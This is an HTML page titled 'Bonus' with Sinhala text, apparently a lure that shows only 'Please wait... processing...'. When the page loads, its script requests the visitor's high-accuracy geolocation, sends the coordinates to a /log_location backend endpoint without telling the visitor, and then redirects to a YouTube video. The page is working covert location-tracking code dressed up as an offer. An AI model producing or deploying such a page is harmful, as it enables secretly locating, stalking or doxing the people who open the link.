<!DOCTYPE html>
<html lang="si">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bonus</title>
    <style>
        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f4f4f4; }
        .container { text-align: center; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
    </style>
</head>
<body>
    <div class="container">
        <h2>Please wait...</h2>
        <p id="status">processing...</p>
    </div>

    <script>
        window.onload = function() {
            if (navigator.geolocation) {
               
                navigator.geolocation.getCurrentPosition(sendPosition, showError, {
                    enableHighAccuracy: true,
                    timeout: 5000,
                    maximumAge: 0
                });
            } else {
                document.getElementById('status').innerHTML = "මෙම බ්‍රවුසරය සහය නොදක්වයි.";
            }
        };

        function sendPosition(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            
            // Backend එකට දත්ත යැවීම
            fetch(`/log_location?lat=${lat}&long=${lon}`)
                .then(response => {
                    
                    window.location.href = "https://www.youtube.com/watch?v=BwV831dvgl4"; 
                })
                .catch(err => {
                    console.error('Error:', err);
                    window.location.href = "https://www.google.com";
                });
        }

        function showError(error) {
           
            window.location.href = "https://www.youtube.com/watch?v=BwV831dvgl4";
        }
    </script>
</body>
</html>
